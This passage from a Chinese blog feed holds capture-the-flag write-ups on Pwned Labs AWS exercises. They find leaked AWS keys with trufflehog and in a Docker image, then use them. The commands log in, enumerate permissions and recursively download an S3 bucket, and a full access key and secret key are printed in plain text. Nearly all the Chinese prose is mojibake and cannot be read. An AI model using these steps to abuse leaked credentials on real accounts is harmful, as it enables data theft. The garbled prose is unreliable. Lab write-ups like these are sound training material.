https://github.com/huge-logistics/cargo-logistics-dev --max-depth 2<br></code></pre></td></tr></table></figure><p>trufflehog ä¼šæ˜¾ç¤ºæš´éœ²çš„ AWS å¯†é’¥å’Œå—å½±å“çš„æ–‡ä»¶ä»¥åŠå†å²æäº¤ï¼š</p><p><img src="/image/image_iTtOT_s-e2.png"></p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å¯¹æœ¬åœ° Git æ–‡ä»¶å¤¹è¿›è¡Œæ‰«æï¼š</p><ul><li><code>--regex</code>  ï¼šå¯ç”¨æ­£åˆ™è¡¨è¾¾å¼æ‰«ææ¨¡å¼ã€‚ä½¿ç”¨å†…ç½®æˆ–è‡ªå®šä¹‰çš„æ­£åˆ™å»åŒ¹é…å¸¸è§çš„å‡­è¯æ ¼å¼ï¼ˆå¦‚ AWS å¯†é’¥ã€Slack Tokenã€API Key ç­‰ï¼‰ã€‚</li><li><code>--no-entropy</code>  ï¼šç¦ç”¨ç†µå€¼åˆ†æã€‚TruffleHog é»˜è®¤ä¼šç”¨â€œç†µâ€æ¥åˆ¤æ–­ä¸€æ®µå­—ç¬¦ä¸²æ˜¯å¦åƒå¯†é’¥ï¼ˆéšæœºæ€§é«˜ï¼‰ï¼Œè¿™ä¸ªå‚æ•°å…³é—­è¯¥åŠŸèƒ½ï¼Œåªä¾èµ–æ­£åˆ™æ¥åˆ¤æ–­ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trufflehog git file://cargo-logistics-dev/ --regex --no-entropy<br></code></pre></td></tr></table></figure><p>trufflehog æ˜¾ç¤ºè¯¥ Git æ–‡ä»¶å¤¹å­˜åœ¨å¤šå¤„æ•æ„Ÿä¿¡æ¯æ³„æ¼ï¼š</p><table><thead><tr><th>æäº¤è¯´æ˜</th><th>æäº¤ ID</th><th>æ–‡ä»¶</th><th>æ³„æ¼å†…å®¹</th></tr></thead><tbody><tr><td>Adding Backend</td><td>5ea567e3f51523b2168aac58b3a1fe634e5610a0</td><td>Backend&#x2F;.zipã€backend.zip</td><td>AKIAWHEOTHRFSGQITLIY</td></tr><tr><td>Initial Commit</td><td>d8098af5fbf1aa35ae22e99b9493ffae5d97d58f</td><td>log-s3-test&#x2F;log-upload.php</td><td>AKIAWHEOTHRFSGQITLIY</td></tr></tbody></table><p><img src="/image/image_3bF-fxi0sZ.png"></p><h3 id="6-4-å‡­è¯æ»¥ç”¨"><a href="#6-4-å‡­è¯æ»¥ç”¨" class="headerlink" title="6.4 å‡­è¯æ»¥ç”¨"></a>6.4 å‡­è¯æ»¥ç”¨</h3><p>ä½¿ç”¨è·å–çš„ AWS å‡­è¯ç™»å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br>aws sts get-caller-identity<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_qQS9LNoUPx.png"></p><p>åˆ—å‡º s3 å­˜å‚¨æ¡¶ä¸­æ•°æ®ï¼Œå¹¶é€’å½’ä¸‹è½½å­˜å‚¨æ¡¶ä¸­çš„æ‰€æœ‰å†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://huge-logistics-transact<br>aws s3 <span class="hljs-built_in">cp</span> s3://huge-logistics-transact . --recursive<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_iccbobI0TV.png"></p><p>æŸ¥çœ‹ flag å’Œæ•æ„Ÿæ•°æ®ï¼Œæˆ‘ä»¬å‘ç°<code>web_transactions.csv</code> åŒ…å«äº†ç”¨æˆ·åã€é‚®ä»¶å’Œ IP å¾—çŸ¥ç­‰ä¸ªäººä¿¡æ¯ã€‚</p><p><img src="/image/image_OX6pbw-T7D.png"></p><h2 id="0x07-æ€»ç»“"><a href="#0x07-æ€»ç»“" class="headerlink" title="0x07 æ€»ç»“"></a>0x07 æ€»ç»“</h2><p>æŸ¥çœ‹æœ¬æ¬¡æ‰€æä¾›çš„ Github ä»“åº“çš„<a href="https://github.com/huge-logistics/cargo-logistics-dev/commit/ea1a7618508b8b0d4c7362b4044f1c8419a07d99" title="æäº¤è®°å½•">æäº¤è®°å½•</a>ï¼Œæˆ‘ä»¬å‘ç°ï¼Œå³ä½¿å·²ç»åˆ é™¤äº† AWS å‡­è¯ï¼Œä½†æ›´æ”¹æ°¸è¿œçš„è¢«è®°å½•èµ·æ¥äº†ã€‚</p><p><img src="/image/image_cILLCRzpPT.png"></p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬è¿˜èƒ½å‘ç°æ›´å¤šçš„ secret å—ï¼Ÿè™½ç„¶æˆ‘ä»¬å·²ç»ä½¿ç”¨äº†ä¸€äº›è‡ªåŠ¨åŒ–çš„æ‰«æå·¥å…·ã€‚ä½†è¿™äº›å·¥å…·ä¹Ÿæœ‰å¯èƒ½ä¼šé—æ¼ä¸€äº›å¸¸è§å­—ç¬¦ï¼Œä¾‹å¦‚<code>mysqli_connect</code>ã€‚</p><p><img src="/image/image_oXJYpAxOv1.png"></p><p>äºšé©¬é€Šåšå¾—å¾ˆä¸é”™çš„æ˜¯ï¼Œä»–ä»¬ä¼šå¯¹æ³„æ¼çš„ secret è¿›è¡Œç›‘æ§ï¼Œå¹¶ä¸”ååº”ç‰¹åˆ«è¿…é€Ÿï¼Œåœ¨äº‹æ•…å‘ç”Ÿåçš„ 10 åˆ†é’Ÿå†…å°±å¯ä»¥åšå‡ºå“åº”äº†ã€‚æ­£å¦‚ä¸‹æ–¹ AWS é‚®ä»¶ä¸­æ‰€æåˆ°çš„ï¼Œ<strong>å»ºè®®é…ç½®å®‰å…¨è”ç³»äºº</strong>ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒAWS ä¼šå°è¯•è”ç³»è´¦æˆ·æ³¨å†Œæ—¶å¡«å†™çš„ç”µå­é‚®ç®±ï¼Œä½†è¿™ä¸ªé‚®ç®±åœ¨å¾ˆå¤šæƒ…å†µä¸‹å¯èƒ½å¹¶ä¸ä¼šè¢«äººç›‘æ§ã€‚</p><p><img src="/image/image_ydkvrwWj-V.png"></p><p>è¿™å°é‚®ä»¶å†…å®¹è¾ƒé•¿ï¼Œä½†ä¸‹é¢æ€»ç»“äº†å…³é”®ç‚¹ä»¥åŠ AWS æ‰€é‡‡å–çš„æªæ–½æ¥ç¼“è§£æ³„éœ²çš„å½±å“ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦ä¸€ä¸ªå…¬å¸ï¼ˆGitGuardianï¼‰ä¹ŸæŒ‡å‡ºäº†è¯¥é—®é¢˜ã€‚å½“ç„¶ï¼Œä¹Ÿæœ‰è®¸å¤šå…¶ä»–å®ä½“ï¼ˆåŒ…æ‹¬æ¶æ„æ”»å‡»è€…ï¼‰åœ¨ GitHub ä¸Šæ‰«ææ³„éœ²çš„å‡­è¯ä¿¡æ¯ã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">We have become aware that the AWS Access Key AKIAWHEOTHRFSGQITLIY , belonging to IAM User dev-test , along with the corresponding Secret Key is publicly available online at https://github.com/huge-logistics/cargo-logistics-dev/blob/8f53c36b3888da71f3f6ae3a13ca1fe26950793d/log-s3-test/log-upload.php.<br><br>&lt;SNIP&gt;<br><br>To protect your account from excessive charges and unauthorized activity, we have applied the &quot;AWSCompromisedKeyQuarantineV2&quot; AWS Managed Policy (&quot;Quarantine Policy&quot;) to the IAM User listed above. The Quarantine Policy applied to the User protects your account by denying access to high risk actions like iam:CreateAccessKey and ec2:RunInstances.<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ç™»å½• AWS æ§åˆ¶å°æŸ¥çœ‹å—å½±å“çš„ç”¨æˆ·æ—¶ï¼Œä¼šçœ‹åˆ°è¯¥æ‰˜ç®¡ç­–ç•¥<strong>AWSCompromisedKeyQuarantineV2</strong> å·²ç›´æ¥é™„åŠ ã€‚è¯¥ç­–ç•¥ä¼šç¦æ­¢ä¸€ç³»åˆ—é«˜é£é™©æ“ä½œï¼Œæ¯”å¦‚åˆ›å»ºå’Œåˆ é™¤èµ„æºã€‚</p><p><img src="/image/image_QBijj6ELGE.png"></p><p>AWS æä¾›äº†ä¸€ç¯‡æ–‡ç« ã€Š<a href="https://aws.amazon.com/cn/blogs/security/what-to-do-if-you-inadvertently-expose-an-aws-access-key/" title="å¦‚æœä½ ä¸å°å¿ƒæ³„éœ²äº† AWS Access Key åº”è¯¥æ€ä¹ˆåš">å¦‚æœä½ ä¸å°å¿ƒæ³„éœ²äº† AWS Access Key åº”è¯¥æ€ä¹ˆåš</a>ã€‹ï¼Œæ¨èé˜…è¯»ï¼Œå†…å®¹åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li><strong>ç¡®å®šè¿™äº›å‡­è¯èƒ½å¤Ÿè®¿é—®å“ªäº›èµ„æº</strong></li><li><strong>ä½¿å‡­è¯å¤±æ•ˆï¼Œé˜²æ­¢ç»§ç»­è¢«ä½¿ç”¨</strong></li><li><strong>è€ƒè™‘åŠé”€é€šè¿‡è¯¥å‡­è¯ç”Ÿæˆçš„ä¸´æ—¶å®‰å…¨å‡­è¯</strong></li><li><strong>æ¢å¤åˆé€‚çš„è®¿é—®æƒé™</strong></li><li><strong>å…¨é¢å®¡æŸ¥ä½  AWS è´¦æˆ·çš„è®¿é—®æƒé™</strong></li></ol><p>æœ€åå€¼å¾—ä¸€æçš„æ˜¯ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»åœ¨ä»“åº“ä¸­å®‰è£…äº†<code>git-secrets</code>ï¼Œå¯ä»¥é˜²æ­¢ç±»ä¼¼çš„é”™è¯¯å†æ¬¡å‘ç”Ÿã€‚</p><p><img src="/image/image_5x-_Jf9Wtm.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>AWS å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uncover Secrets in CodeCommit and Dockerï¼šæ­å¼€ CodeCommit å’Œ Docker çš„ç§˜å¯†</title>
    <link href="/2025/05/02/%E3%80%90Pwned-Labs%E3%80%91Uncover-Secrets-in-CodeCommit-and-Docker%EF%BC%9A%E6%8F%AD%E5%BC%80-CodeCommit-%E5%92%8C-Docker-%E7%9A%84%E7%A7%98%E5%AF%86/"/>
    <url>/2025/05/02/%E3%80%90Pwned-Labs%E3%80%91Uncover-Secrets-in-CodeCommit-and-Docker%EF%BC%9A%E6%8F%AD%E5%BC%80-CodeCommit-%E5%92%8C-Docker-%E7%9A%84%E7%A7%98%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-åœºæ™¯ä»‹ç»"><a href="#0x00-åœºæ™¯ä»‹ç»" class="headerlink" title="0x00 åœºæ™¯ä»‹ç»"></a>0x00 åœºæ™¯ä»‹ç»</h2><p>Huge Logistics å…¬å¸é‚€è¯·ä½ ä»¬å›¢é˜Ÿè¿›è¡Œä¸€æ¬¡å®‰å…¨è¯„ä¼°ã€‚</p><p>ä½ ä»¬çš„ä¸»è¦ç›®æ ‡æ˜¯å®¡æŸ¥ä»–ä»¬çš„å…¬å…±ä»£ç ä»“åº“ï¼ŒæŸ¥æ‰¾æ˜¯å¦å­˜åœ¨è¢«å¿½ç•¥çš„å‡­æ®æˆ–æ•æ„Ÿä¿¡æ¯ã€‚</p><p>å¦‚æœå‘ç°ç›¸å…³ä¿¡æ¯ï¼Œå¯ä»¥åˆ©ç”¨å®ƒä»¬è·å–å¯¹å…¶äº‘åŸºç¡€è®¾æ–½çš„åˆå§‹è®¿é—®æƒé™ã€‚</p><p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œç»§ç»­è¿›è¡Œæ¨ªå‘ä¸çºµå‘æ¸—é€ï¼Œä»¥å±•ç¤ºæ½œåœ¨çš„å½±å“ã€‚</p><p>ä½ ä»¬çš„ä»»åŠ¡æ˜¯è¯†åˆ«å‡ºæ‰€æœ‰å®‰å…¨æ¼æ´ï¼Œå¸®åŠ©ä»–ä»¬åŠæ—¶ä¿®å¤ã€‚</p><blockquote><p><strong>ğŸ¯ ç‚¹å‡»ã€é˜…è¯»åŸæ–‡ã€‘ï¼Œç«‹å³è¿›å…¥é¶åœºç¯å¢ƒï¼</strong></p></blockquote><h2 id="0x01-å‰ç½®çŸ¥è¯†"><a href="#0x01-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x01 å‰ç½®çŸ¥è¯†"></a>0x01 å‰ç½®çŸ¥è¯†</h2><ul><li>åŸºæœ¬çš„ Linux å‘½ä»¤è¡ŒçŸ¥è¯†</li></ul><h2 id="0x02-å­¦ä¹ ç›®æ ‡"><a href="#0x02-å­¦ä¹ ç›®æ ‡" class="headerlink" title="0x02 å­¦ä¹ ç›®æ ‡"></a>0x02 å­¦ä¹ ç›®æ ‡</h2><ul><li>ä¸ Docker å®¹å™¨äº¤äº’å¹¶è·å– secret ä¿¡æ¯</li><li>æšä¸¾å¹¶ä» AWS CodeCommit è·å– secret ä¿¡æ¯</li><li>äº†è§£å¦‚ä½•é˜²æ­¢è¿™ç§æƒ…å†µçš„å‘ç”Ÿ</li></ul><h2 id="0x03-éš¾åº¦ç­‰çº§"><a href="#0x03-éš¾åº¦ç­‰çº§" class="headerlink" title="0x03 éš¾åº¦ç­‰çº§"></a>0x03 éš¾åº¦ç­‰çº§</h2><ul><li>åŸºç¡€ï¼ˆFoundationsï¼‰</li></ul><h2 id="0x04-å…³æ³¨é‡ç‚¹"><a href="#0x04-å…³æ³¨é‡ç‚¹" class="headerlink" title="0x04 å…³æ³¨é‡ç‚¹"></a>0x04 å…³æ³¨é‡ç‚¹</h2><ul><li>çº¢é˜Ÿï¼ˆRedï¼‰</li></ul><h2 id="0x05-çœŸå®èƒŒæ™¯"><a href="#0x05-çœŸå®èƒŒæ™¯" class="headerlink" title="0x05 çœŸå®èƒŒæ™¯"></a>0x05 çœŸå®èƒŒæ™¯</h2><p>å®¹å™¨åŒ–å·²æˆä¸ºäº’è”æœåŠ¡çš„åŸºç¡€æ€§å…ƒç´ ï¼ŒDocker ä½œä¸ºé¢†å…ˆçš„å®¹å™¨åŒ–å¹³å°è„±é¢–è€Œå‡ºã€‚</p><p>Docker Hub åŒ…å«è¶…è¿‡ 900 ä¸‡ä¸ªå¯ä»¥ä¾›ä»»ä½•äººä½¿ç”¨çš„é•œåƒã€‚</p><p>åœ¨ä¸€é¡¹å…³äºå®¹å™¨å®‰å…¨çš„é‡è¦ç ”ç©¶ä¸­ï¼Œæ¥è‡ªäºšç›å·¥ä¸šå¤§å­¦çš„ç ”ç©¶äººå‘˜æ£€æŸ¥äº† Docker Hub ä¸Šçš„ 337,171 ä¸ªé•œåƒå’Œ 8,076 ä¸ªæ¥è‡ªç§æœ‰ä»“åº“çš„é•œåƒã€‚</p><p>ä»–ä»¬å‘ç°è¶…è¿‡ 8% çš„è¿™äº›é•œåƒåŒ…å« secret æ•°æ®ï¼Œå¦‚ç§é’¥å’Œ API å¯†é’¥ã€‚å…·ä½“æ¥è¯´ï¼Œä»–ä»¬è¯†åˆ«å‡ºäº† 52,107 ä¸ªç§é’¥å’Œ 3,158 ä¸ªæš´éœ²çš„ API å¯†é’¥ã€‚åœ¨è¿™äº› API å¯†é’¥ä¸­ï¼Œ2,920 ä¸ªå±äºäº‘æœåŠ¡æä¾›å•†ï¼Œç ”ç©¶äººå‘˜è¿˜è¯†åˆ«å‡ºäº† 1,213 ä¸ª AWS API çš„å¯†é’¥ã€‚</p><h2 id="0x06-è§£é¢˜æ€è·¯"><a href="#0x06-è§£é¢˜æ€è·¯" class="headerlink" title="0x06 è§£é¢˜æ€è·¯"></a>0x06 è§£é¢˜æ€è·¯</h2><h3 id="6-1-å…¬å¼€èµ„æºä¾¦å¯Ÿ"><a href="#6-1-å…¬å¼€èµ„æºä¾¦å¯Ÿ" class="headerlink" title="6.1 å…¬å¼€èµ„æºä¾¦å¯Ÿ"></a>6.1 å…¬å¼€èµ„æºä¾¦å¯Ÿ</h3><p>æˆ‘ä»¬é¦–å…ˆåœ¨ Docker Hub ä¸Šæœç´¢ä¸ Huge Logistics æ˜æ˜¾ç›¸å…³çš„é•œåƒï¼š</p><figure class="highlight bash"><figcaption><span>title</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://hub.docker.com/search?q=huge-logistics<br></code></pre></td></tr></table></figure><p><img src="/image/image_Lh2ghsWg2w.png"></p><p>å…¶ä¸­ï¼Œé•œåƒ<code>huge-logistics-terraform-runner</code>çœ‹èµ·æ¥æ˜¯ç”¨äºäº‘ç¯å¢ƒé…ç½®å’Œç®¡ç†çš„ï¼Œå…¶æ ‡ç­¾ï¼ˆtagï¼‰ä¸º<code>0.12</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://hub.docker.com/r/hljose/huge-logistics-terraform-runner/tags<br></code></pre></td></tr></table></figure><p><img src="/image/image_kIF-9t9b0V.png"></p><p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ Docker CLI æ¥æœç´¢ç›¸å…³é•œåƒï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker search huge-logistics<br></code></pre></td></tr></table></figure><p><img src="/image/image_mvgBTbbMXs.png"></p><blockquote><p>å¦‚æœæç¤ºéœ€è¦ç™»å½•æ‰èƒ½æœç´¢é•œåƒï¼Œå¯å…ˆå®‰è£…<a href="https://docs.docker.com/get-started/get-docker/" title="Docker Desktop">Docker Desktop</a>ï¼Œå¹¶ç™»å½•è´¦å·ï¼Œæˆ–ä½¿ç”¨å‘½ä»¤<code>docker login</code>ã€‚ä¸ç†Ÿæ‚‰ Docker Desktopã€Docker Engine å’Œ Docker CLI çš„åŒå­¦ï¼Œå¯ä»¥å‚è€ƒæˆ‘ä»¬çš„æ–‡ç« ã€Š<a href="../../21/%E5%B0%8F%E7%8C%AB%E5%92%AA%E5%B8%A6%E4%BD%A0%E7%90%86%E6%B8%85Docker%E3%80%81containerd%E3%80%81CRI-O-%E5%92%8C-runc-%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB/index.html" title="å°çŒ«å’ªå¸¦ä½ ç†æ¸…Dockerã€containerdã€CRI-O å’Œ runc ä¹‹é—´çš„åŒºåˆ«">å°çŒ«å’ªå¸¦ä½ ç†æ¸… Dockerã€containerdã€CRI-O å’Œ runc ä¹‹é—´çš„åŒºåˆ«</a>ã€‹ã€‚</p></blockquote><p>æƒ³æŸ¥çœ‹é•œåƒçš„ tag ä¿¡æ¯ï¼Œå¯ä»¥è®¿é—®å¦‚ä¸‹æ¥å£ï¼Œå¹¶é…åˆ<code>jq</code> å·¥å…·ç»“æ„åŒ–è§£æè¿”å›çš„ JSONï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://hub.docker.com/v2/repositories/hljose/huge-logistics-terraform-runner/tags | jq<br></code></pre></td></tr></table></figure><p><img src="/image/image_-gFAplbVAN.png"></p><p>ä½¿ç”¨<a href="https://github.com/containers/skopeo" title="Skopeo">Skopeo</a> å·¥å…·å¯ä»¥æ›´ä¾¿æ·åœ°æŸ¥çœ‹é•œåƒä¿¡æ¯ã€‚Skopeo æ”¯æŒåœ¨æ— éœ€ä¸‹è½½é•œåƒçš„æƒ…å†µä¸‹è¿›è¡Œè¿œç¨‹æ“ä½œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">skopeo inspect docker://hljose/huge-logistics-terraform-runner:0.12<br></code></pre></td></tr></table></figure><p><img src="/image/image_4rne9EVGKr.png"></p><h3 id="6-2-é•œåƒå®‰å…¨åˆ†æ"><a href="#6-2-é•œåƒå®‰å…¨åˆ†æ" class="headerlink" title="6.2 é•œåƒå®‰å…¨åˆ†æ"></a>6.2 é•œåƒå®‰å…¨åˆ†æ</h3><p>æ¥ç€ï¼Œæˆ‘ä»¬æ‹‰å–è¯¥é•œåƒè‡³æœ¬åœ°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull hljose/huge-logistics-terraform-runner:0.12<br></code></pre></td></tr></table></figure><p><img src="/image/image_pOjUXuko6P.png"></p><p>ä½¿ç”¨ Docker Scout æ’ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿè·å–é•œåƒçš„åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…¶æ¼æ´æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker scout quickview hljose/huge-logistics-terraform-runner:0.12<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœæ˜¾ç¤ºï¼Œè¯¥é•œåƒçš„åŸºç¡€é•œåƒæ˜¯ <code>Alpine</code>ã€‚<code>Alpine</code> é•œåƒçš„æœ€å°å®‰è£…ä½“ç§¯ä¸åˆ° 5 MBï¼Œæ¯”è®¸å¤šå…¶å®ƒçš„ Linux å‘è¡Œç‰ˆè¦å°å¾—å¤šï¼Œå¯ä»¥ç¼©çŸ­æ„å»ºæ—¶é—´ã€åŠ å¿«åˆ†å‘é€Ÿåº¦å¹¶é™ä½å­˜å‚¨æˆæœ¬ï¼Œå› æ­¤æˆä¸ºäº†ä¸€ç§éå¸¸å—æ¬¢è¿çš„é€‰æ‹©ã€‚</p><p><img src="/image/image_AJ0ThhaxlH.png"></p><p>ç»§ç»­ä½¿ç”¨ Docker Scout æŸ¥çœ‹é•œåƒä¸­å­˜åœ¨çš„å·²çŸ¥æ¼æ´ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker scout cves hljose/huge-logistics-terraform-runner:0.12<br></code></pre></td></tr></table></figure><p><img src="/image/image_jA3fKRcHN9.png"></p><blockquote><p>è‹¥ç³»ç»Ÿä¸­å°šæœªå®‰è£… Docker Scout æ’ä»¶ï¼Œå¯é€šè¿‡ä»¥ä¸‹å‘½ä»¤å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://raw.githubusercontent.com/docker/scout-cli/main/install.sh -o install-scout.sh<br>sh install-scout.sh<br></code></pre></td></tr></table></figure></blockquote><h3 id="6-3-å®¹å™¨å†…éƒ¨æ¢ç´¢"><a href="#6-3-å®¹å™¨å†…éƒ¨æ¢ç´¢" class="headerlink" title="6.3 å®¹å™¨å†…éƒ¨æ¢ç´¢"></a>6.3 å®¹å™¨å†…éƒ¨æ¢ç´¢</h3><p>æˆ‘ä»¬å°†è¯¥é•œåƒä»¥äº¤äº’æ¨¡å¼è¿è¡Œä¸ºå®¹å™¨ï¼Œå¹¶ä¸ºå…¶æŒ‡å®šåç§°ä¸º<code>miao2sec</code>ã€‚ç”±äºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ arm64 æ¶æ„çš„è®¾å¤‡ï¼Œè¿˜éœ€æŒ‡å®šè¿è¡Œå¹³å°ä¸º<code>linux/amd64</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --name miao2sec --platform=linux/amd64 hljose/huge-logistics-terraform-runner:0.12 /bin/bash<br></code></pre></td></tr></table></figure><p>è¿›å…¥å®¹å™¨åï¼Œæˆ‘ä»¬å‘ç°ä¸€ä¸ªåä¸º <code>workspace</code> çš„éé»˜è®¤ç›®å½•ï¼Œä½†è¯¥ç›®å½•ä¸ºç©ºã€‚</p><p><img src="/image/image_-fRux-3Jw4.png"></p><p>æ¥ç€ï¼Œä½¿ç”¨<code>env</code> å‘½ä»¤æŸ¥çœ‹é•œåƒä¸­æ˜¯å¦ä»¥ç¯å¢ƒå˜é‡æ–¹å¼å­˜å‚¨äº†æ•æ„Ÿä¿¡æ¯ã€‚ç»“æœæ˜¾ç¤ºï¼Œæˆ‘ä»¬æ„å¤–è·å–åˆ°äº† AWS å‡­è¯ï¼Œåç»­å°†åŸºäºè¯¥å‡­è¯è¿›è¡Œè¿›ä¸€æ­¥æ“ä½œã€‚</p><p><img src="/image/image_bazxzI1OoT.png"></p><p>åœ¨<code>/usr/local/bin</code>ä¸‹ï¼Œè¿˜å‘ç°äº†ä¸‰ä¸ªè„šæœ¬æ–‡ä»¶ï¼š<code>aws-creds-test.sh</code>ï¼ˆå‡­è¯æµ‹è¯•ï¼‰ã€<code>backup.sh</code>ï¼ˆå¤‡ä»½è„šæœ¬ï¼‰ä»¥åŠ<code>health-check.sh</code>ï¼ˆå¥åº·æ£€æŸ¥è„šæœ¬ï¼‰ã€‚ç„¶è€Œä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œè¿™äº›è„šæœ¬å¹¶æœªå¸¦æ¥å®è´¨æ€§çš„ä»·å€¼ï¼Œä¸”<code>health-check.sh</code>ä¸­çš„ URL æ— æ³•è®¿é—®ã€‚</p><p><img src="/image/image_AHvZbajUlj.png"></p><p>æ›´æ–¹ä¾¿çš„æ–¹å¼æ˜¯ä½¿ç”¨<code>docker inspect</code>æŸ¥çœ‹é•œåƒçš„ç¯å¢ƒå˜é‡åŠæ›´å¤šä½å±‚ä¿¡æ¯ï¼Œå¦‚ç»´æŠ¤è€…ã€é•œåƒé…ç½®ç­‰ï¼š</p><p><img src="/image/image_xm5FqGHpzx.png"></p><h3 id="6-4-å‡­è¯æ»¥ç”¨"><a href="#6-4-å‡­è¯æ»¥ç”¨" class="headerlink" title="6.4 å‡­è¯æ»¥ç”¨"></a>6.4 å‡­è¯æ»¥ç”¨</h3><p>æˆ‘ä»¬ä½¿ç”¨è·å¾—çš„ AWS å‡­è¯è¿›è¡Œç™»å½•ï¼Œå¹¶ç¡®è®¤å…¶èº«ä»½ä¸º <code>prod-deploy</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br>aws sts get-caller-identity<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_tdyx9YCH-K.png"></p><h3 id="6-5-è‡ªåŠ¨åŒ–æƒé™åˆ†æ"><a href="#6-5-è‡ªåŠ¨åŒ–æƒé™åˆ†æ" class="headerlink" title="6.5 è‡ªåŠ¨åŒ–æƒé™åˆ†æ"></a>6.5 è‡ªåŠ¨åŒ–æƒé™åˆ†æ</h3><p>æ¥ä¸‹æ¥ï¼Œä½¿ç”¨<a href="https://github.com/shabarkin/aws-enumerator" title="aws-enumerator">aws-enumerator</a> è‡ªåŠ¨æšä¸¾æƒé™ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">go install -v github.com/shabarkin/aws-enumerator@latest<br></code></pre></td></tr></table></figure><p>æä¾› AWS å‡­è¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws-enumerator cred -aws_region us-east-1 -aws_access_key_id AKIA3NRSK2PTOA5KVIUF -aws_secret_access_key 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<br></code></pre></td></tr></table></figure><p>å®ƒä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆ<code>.env</code> æ–‡ä»¶ï¼š</p><p><img src="/image/image_ur4VKzjq57.png"></p><p>æ‰§è¡Œæšä¸¾å‘½ä»¤ï¼Œåˆ—å‡º AWS ä¸­æš´éœ²çš„æœåŠ¡ä¸èµ„æºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws-enumerator enum<br></code></pre></td></tr></table></figure><p>å¦‚å›¾æ‰€ç¤ºï¼Œè¯¥å‘½ä»¤è¿”å›äº†ä¸€ä¸ªå…³äº code commit çš„æç¤ºã€‚AWS CodeCommit æ˜¯ä¸€é¡¹å®Œå…¨æ‰˜ç®¡çš„æºä»£ç æ§åˆ¶æœåŠ¡ï¼Œå¯ä¸å…¶ä»– AWS æœåŠ¡ç´§å¯†é›†æˆï¼Œå¹¶æä¾›ä¸€ç§åœ¨å®‰å…¨ä¸”å¯æ‰©å±•çš„ç¯å¢ƒä¸­åä½œå¤„ç†ä»£ç çš„æ–¹æ³•ã€‚</p><p><img src="/image/image_zDOdz1HwKz.png"></p><table><thead><tr><th>æœåŠ¡</th><th>æšä¸¾çŠ¶æ€</th><th>æ½œåœ¨é£é™©è¯´æ˜</th></tr></thead><tbody><tr><td>CodeCommit</td><td>æˆåŠŸæšä¸¾ 1&#x2F;2 ä¸ªä»“åº“</td><td>å¯èƒ½å­˜åœ¨æ•æ„Ÿæºä»£ç æ³„éœ²é£é™©</td></tr><tr><td>DynamoDB</td><td>æˆåŠŸæšä¸¾ 1&#x2F;5 